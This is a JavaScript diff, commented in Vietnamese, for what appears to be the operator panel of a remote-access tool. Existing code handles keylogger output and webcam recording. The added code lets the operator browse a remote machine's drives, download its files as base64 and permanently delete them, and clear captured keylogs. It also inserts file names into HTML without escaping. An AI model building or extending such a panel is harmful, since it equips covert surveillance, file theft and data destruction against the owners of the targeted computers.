@@ -165,10 +165,20 @@ function handleJsonData(jsonString) {
             document.getElementById("cam-status").innerText = "LIVE";
         }
         break;
-    }
-  } catch (e) {
-    console.error("JSON Error:", e);
-  }
+
+        case "FILE_LIST":
+            renderFileManager(msg.payload);
+            break;
+
+        case "FILE_DOWNLOAD_DATA":
+            // payload bây giờ là object { fileName, data }
+            const fileInfo = msg.payload;
+            downloadFileFromBase64(fileInfo.fileName, fileInfo.data);
+            break;
+            }
+          } catch (e) {
+            console.error("JSON Error:", e);
+          }
 }
 
 function handleBinaryStream(arrayBuffer) {
@@ -682,6 +692,18 @@ function handleKeylogData(dataString) {
   }
 }
 
+function clearAllKeylogs() {
+    // 1. Xóa nội dung ô Raw Input (dạng div)
+    const rawOutput = document.getElementById("raw-key-output");
+    if (rawOutput) rawOutput.innerHTML = "";
+
+    // 2. Xóa nội dung ô Document View (dạng textarea)
+    const docEditor = document.getElementById("keylogger-editor");
+    if (docEditor) docEditor.value = "";
+    
+    showToast("Đã xóa dữ liệu Keylogger", "success");
+}
+
 function startRecordWebcam() {
   const duration = document.getElementById("record-duration").value;
   sendCmd("RECORD_WEBCAM", duration);
@@ -732,3 +754,93 @@ function downloadImageFromBase64(base64) {
     link.click();
     document.body.removeChild(link);
 }
+
+// --- FILE MANAGER LOGIC ---
+let currentPath = "";
+
+function getDrives() {
+    currentPath = ""; // Về gốc
+    document.getElementById("current-path").innerText = "My Computer";
+    sendCmd("GET_DRIVES");
+}
+
+function openFolder(path) {
+    currentPath = path;
+    document.getElementById("current-path").innerText = path;
+    sendCmd("GET_DIR", path);
+}
+
+function reqDownloadFile(path) {
+    if(confirm("Bạn muốn tải file này về máy?")) {
+        sendCmd("DOWNLOAD_FILE", path);
+    }
+}
+
+function reqDeleteFile(path) {
+    if(confirm("CẢNH BÁO: Bạn có chắc chắn muốn xóa file này vĩnh viễn không?")) {
+        sendCmd("DELETE_FILE", path);
+        // Tự động load lại thư mục sau 1 giây
+        setTimeout(() => openFolder(currentPath), 1000);
+    }
+}
+
+function renderFileManager(items) {
+    if(items.error) {
+        showToast(items.error, "error");
+        return;
+    }
+
+    const tbody = document.getElementById("file-list-body");
+    tbody.innerHTML = "";
+
+    items.forEach(item => {
+        const tr = document.createElement("tr");
+        
+        let icon = "fa-file";
+        let actionBtn = "";
+        let clickEvent = "";
+
+        if (item.Type === "DRIVE") {
+            icon = "fa-hdd text-primary";
+            clickEvent = `onclick="openFolder('${item.Path.replace(/\\/g, "\\\\")}')"`;
+        } else if (item.Type === "FOLDER") {
+            icon = "fa-folder text-warning";
+            clickEvent = `onclick="openFolder('${item.Path.replace(/\\/g, "\\\\")}')"`;
+        } else if (item.Type === "BACK") {
+            icon = "fa-level-up-alt";
+            clickEvent = `onclick="openFolder('${item.Path.replace(/\\/g, "\\\\")}')"`;
+        } else {
+            // Là FILE
+            icon = "fa-file-alt text-light";
+            // Nút tải và xóa
+            const safePath = item.Path.replace(/\\/g, "\\\\");
+            actionBtn = `
+                <button class="btn btn-sm btn-success me-1" onclick="reqDownloadFile('${safePath}')">
+                    <i class="fas fa-download"></i>
+                </button>
+                <button class="btn btn-sm btn-danger" onclick="reqDeleteFile('${safePath}')">
+                    <i class="fas fa-trash"></i>
+                </button>
+            `;
+        }
+
+        tr.innerHTML = `
+            <td ${clickEvent} style="cursor:pointer"><i class="fas ${icon}"></i></td>
+            <td ${clickEvent} style="cursor:pointer; font-weight: 500;">${item.Name}</td>
+            <td>${item.Size || ""}</td>
+            <td>${actionBtn}</td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+function downloadFileFromBase64(fileName, base64) {
+    const link = document.createElement('a');
+    link.href = 'data:application/octet-stream;base64,' + base64;
+    link.download = fileName;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    showToast("Đang tải file xuống...", "success");
+}
+
